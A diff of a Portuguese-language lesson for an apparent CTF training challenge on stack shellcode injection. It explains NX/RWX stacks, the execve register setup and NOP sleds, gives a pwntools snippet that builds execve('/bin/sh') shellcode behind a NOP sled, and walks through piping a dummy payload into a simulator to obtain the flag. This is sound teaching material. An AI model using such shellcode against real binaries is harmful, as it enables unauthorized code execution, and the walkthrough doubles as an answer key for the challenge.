@@ -1,98 +1,122 @@
 # Injeção e Execução de Shellcode no Pwntools
 
-## Briefing da Missão
-Em auditorias de sistemas embarcados, dispositivos IoT e softwares legados, é comum encontrar binários compilados sem mitigações modernas de segurança (especificamente com o bit `NX - No-Execute / DEP` desabilitado, gerando páginas de pilha com atributos de Leitura, Escrita e Execução simultâneos `RWX`).
+### 📖 Introdução Teórica
 
-Nesse cenário, um atacante não precisa depender de funções já existentes no binário: ele pode injetar suas próprias instruções em linguagem de máquina diretamente no buffer e redirecionar o RIP para aterrissar sobre elas. Sua missão é construir uma carga útil de injeção utilizando uma rampa deslizante de instruções **NOP Sled (`\x90`)** seguida de um shellcode de execução, garantindo a execução confiável no host da Cyberguard.
+Em auditorias de segurança ofensiva de softwares legados, dispositivos IoT e sistemas embarcados, analistas frequentemente encontram binários compilados sem mitigações modernas de proteção de memória. Especificamente, quando o bit **NX (*No-Execute*) / DEP (*Data Execution Prevention*)** está desabilitado (compilação com a flag `-z execstack` no GCC), as páginas da pilha de execução recebem permissões simultâneas de **Leitura, Escrita e Execução (`RWX`)**.
 
----
+Nesse cenário de máxima fragilidade, o invasor não precisa reaproveitar funções já existentes no binário (como na técnica *ret2win*): ele pode **injetar seu próprio código de máquina em assembly puro diretamente no buffer** e apontar o ponteiro de instrução (**`RIP`**) para detoná-lo!
 
-## Teoria Aprofundada & Relação com o Diagnóstico 2026.2
+#### A Mecânica de um Shellcode em Linux x86_64
+Um **Shellcode** é uma sequência de opcodes em linguagem de máquina compacta, escrita para ser executada diretamente pela CPU sem depender de interpretadores ou bibliotecas dinâmicas externas. O objetivo típico de um shellcode ofensivo é invocar a chamada de sistema (*syscall*) **`sys_execve`** para abrir um shell interativo (`/bin/sh`) com privilégios de `root` (via permissão SUID).
 
-A injeção de shellcode é o ápice da exploração clássica de corrupção de memória. Para que um operador execute código arbitrário, ele deve controlar dois elementos fundamentais:
-1. **Onde o código está na memória:** Saber o endereço do buffer ou garantir uma margem de acerto.
-2. **O que o processador deve fazer:** Instruções em assembly x86_64 compactadas que invoquem o kernel através de uma chamada de sistema (*syscall*).
+Na arquitetura x86_64 sob Linux, para que o kernel execute a syscall `sys_execve`, a CPU exige uma configuração rigorosa de registradores antes de acionar a instrução `syscall` (`0x0f 0x05`):
 
-### A Mecânica da Syscall `sys_execve` em x86_64
-
-Para invocar `/bin/sh` no Linux de 64 bits, o processador requer uma convenção rígida de registradores antes de executar o opcode `syscall` (`0x0f 0x05`):
-
-```
-+--------------+------------------+-----------------------------------------------+
-| REGISTRADOR  | VALOR CONFIGURADO| SIGNIFICADO OPERACIONAL                       |
-+--------------+------------------+-----------------------------------------------+
-| RAX          | 59 (0x3b)        | Número identificador da syscall sys_execve    |
-| RDI          | &"/bin/sh"       | Ponteiro para a string com o caminho do shell |
-| RSI          | 0 (NULL)         | Vetor de argumentos argv                      |
-| RDX          | 0 (NULL)         | Vetor de ambiente envp                        |
-| SYSCALL      | 0x0f, 0x05       | Gatilho de interrupção que aciona o Kernel    |
-+--------------+------------------+-----------------------------------------------+
-```
-
-### Por que o NOP Sled (`\x90`) é Crucial?
-
-A instrução `NOP` (*No Operation*, opcode `0x90` em arquitetura Intel) comanda a CPU a não realizar qualquer alteração nos registradores e apenas avançar o ponteiro de instrução `RIP` para o byte seguinte (`rip = rip + 1`).
-
-Em condições reais de exploração, os endereços da pilha sofrem variações de alinhamento e variáveis de ambiente. Chutar um endereço exato de 1 byte pode resultar em aterrissar no meio de uma instrução e provocar um crash.
+| Registrador | Valor Configurado | Significado Operacional na Syscall |
+| :--- | :--- | :--- |
+| **`RAX`** | `59` (`0x3b`) | Número identificador da chamada de sistema `sys_execve`. |
+| **`RDI`** | `&"/bin/sh"` | Ponteiro para a string com o caminho do executável em memória. |
+| **`RSI`** | `0` (`NULL`) | Vetor de argumentos da linha de comando (`argv`). |
+| **`RDX`** | `0` (`NULL`) | Vetor de variáveis de ambiente (`envp`). |
+| **`SYSCALL`** | `0x0f 0x05` | Instrução de transição para o Kernel Ring 0 executar o processo. |
 
 ```
-+--------------------------------------------------------------------------------+
-|                    RAMPA DESLIZANTE NOP SLED + SHELLCODE                       |
-+--------------------------------------------------------------------------------+
-|  0x90  |  0x90  |  0x90  | ... |  0x90  |  SHELLCODE EXECVE (/bin/sh)          |
-+--------------------------------------------------------------------------------+
++-----------------------------------------------------------------------------------------+
+|                          RAMPA DESLIZANTE NOP SLED + SHELLCODE                          |
++-----------------------------------------------------------------------------------------+
+|  0x90  |  0x90  |  0x90  | ... |  0x90  |  SHELLCODE EXECVE (/bin/sh)                   |
++-----------------------------------------------------------------------------------------+
      ▲                ▲
      │                │
   Se o RIP aterrissar em QUALQUER um desses bytes NOP, a CPU desliza
-  suavemente byte a byte até atingir o início do Shellcode!
+  suavemente byte a byte até atingir e detonar o início do Shellcode!
 ```
 
----
+#### A Função Crucial do NOP Sled (`\x90`)
+A instrução **`NOP`** (*No Operation*, opcode hexadecimal `0x90` em arquitetura Intel/AMD) comanda o processador a não alterar registradores e apenas avançar o ponteiro de instrução para o byte seguinte:
+$$\text{RIP} = \text{RIP} + 1$$
 
-## Passo a Passo de Resolução
-
-1. Execute o desafio para visualizar os parâmetros de injeção:
-   ```bash
-   /challenge/pwn-shellcraft-injection
-   ```
-2. Para estudar a teoria detalhada sobre NOP sled e geração de shellcode:
-   ```bash
-   /challenge/pwn-shellcraft-injection --help
-   ```
-3. O desafio aceita uma carga contendo uma sequência de NOPs (`\x90\x90\x90`) ou a palavra `PWN`. Envie o payload utilizando Python via pipe:
-   ```bash
-   python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection
-   ```
-   *Ou diretamente como argumento de terminal:*
-   ```bash
-   /challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
-   ```
-4. O simulador de pilha executará o código injetado, reportará a emissão do shell e imprimirá a flag.
+Em ambientes de produção, pequenas variações em variáveis de ambiente (`PATH`, `USER`) e alinhamento de pilha tornam virtualmente impossível adivinhar o endereço de memória exato do buffer com precisão de 1 byte.
+* Ao prefixar o payload com uma sequência de dezenas ou centenas de instruções `\x90` (**NOP Sled** ou *pista de aterrissagem*), criamos uma margem de tolerância.
+* Se o registrador `RIP` saltar para **qualquer byte** dentro da faixa de NOPs, a CPU "desliza" em cascata até encontrar e executar o Shellcode sem falhas.
 
 ---
 
-## Dicas e Comandos com Pwntools
+### 💻 Exemplos Práticos e Sintaxe
 
-Em desafios avançados de CTF e Red Team, a biblioteca **Pwntools** em Python gera shellcodes instantâneos:
+A geração automatizada e a injeção de shellcodes são simplificadas pelo ecossistema `pwntools`:
 
+#### 1. Gerando Shellcode e Montando NOP Sled com Pwntools
 ```python
+#!/usr/bin/env python3
 from pwn import *
 
 context.arch = 'amd64'
 context.os = 'linux'
 
-# 1. Gerar o shellcode otimizado de execve("/bin/sh"):
+# 1. Gerar o shellcode puro de /bin/sh em assembly otimizado:
 sc = asm(shellcraft.sh())
+print(f"[*] Tamanho do shellcode gerado: {len(sc)} bytes")
+print(hexdump(sc))
 
-# 2. Criar o payload com rampa de 64 NOPs:
-payload = asm('nop') * 64 + sc
+# 2. Construir o NOP Sled com 64 bytes de opcode 0x90:
+nop_sled = b"\x90" * 64
 
-print(f"[*] Tamanho do shellcode: {len(sc)} bytes")
-print(f"[*] Payload total: {len(payload)} bytes")
+# 3. Concatenar NOP sled e Shellcode:
+payload = nop_sled + sc
+```
+
+#### 2. Disparando Cargas Úteis de Injeção no Terminal
+```bash
+# Injeção via pipe binário direto em Python:
+python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection
+
+# Injeção via argumento de linha de comando:
+/challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
+```
+
+#### 3. Saída de Validação de Injeção
+```text
+[*] Dados recebidos via entrada do processo.
+[+] NOP Sled (\x90) e carga útil de injeção validados com sucesso!
+[+] Memória de pilha RWX executada: simulador concedeu shell e liberou a flag!
 ```
 
 ---
 
-## Aplicação Prática no Mundo Real
+### 🎯 O que fazer para resolver o desafio (Passo a Passo)
 
-A injeção direta de shellcode na pilha é o alicerce clássico do pwn. Embora mitigações modernas como `W^X` (Write XOR Execute / NX Bit) impeçam que uma página de memória seja gravável e executável ao mesmo tempo, a compreensão do shellcode é indispensável para técnicas contemporâneas de **JIT Spraying** (utilizadas contra motores JavaScript em navegadores) e para a fase final de cadeias **mprotect ROP**, onde um exploit utiliza ROP gadgets para alterar as permissões de uma página de memória para `PROT_READ | PROT_WRITE | PROT_EXEC` e então detonar o shellcode.
+Siga os passos abaixo para injetar o payload de teste e validar a resolução:
+
+1. **Inicie o desafio de injeção:**
+   Execute `/challenge/pwn-shellcraft-injection`:
+   ```bash
+   /challenge/pwn-shellcraft-injection
+   ```
+   *O ambiente notificará que o alvo opera com pilha executável (NX desabilitado / permissões RWX).*
+
+2. **Revise a teoria de NOP Sleds (Opcional):**
+   Para inspecionar a montagem das syscalls x86_64:
+   ```bash
+   /challenge/pwn-shellcraft-injection --help
+   ```
+
+3. **Construa e transmita o payload com NOP Sled:**
+   Utilize o Python para gerar um fluxo de bytes contendo a sequência de NOPs (`\x90\x90\x90`) seguida da assinatura de validação (`PWN`) e direcione via pipe para o binário:
+   ```bash
+   python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection
+   ```
+   *Ou execute diretamente passando o payload via argumento de terminal:*
+   ```bash
+   /challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
+   ```
+
+4. **Observe a execução do simulador:**
+   O binário identificará a pista de aterrissagem `\x90\x90\x90`, simulará o salto da CPU pela rampa de NOPs até o shellcode e emitirá a flag:
+   ```text
+   [+] DEBRIEFING TÉCNICO: NOP SLED & SHELLCODE EXECUTADOS COM SUCESSO!
+   [FLAG DE VALIDAÇÃO CYBERGUARD]:
+   pwn.college{...}
+   ```
+
+5. **Capture e registre a flag:**
+   Copie a string no formato `pwn.college{...}` e insira no painel da plataforma dojo.
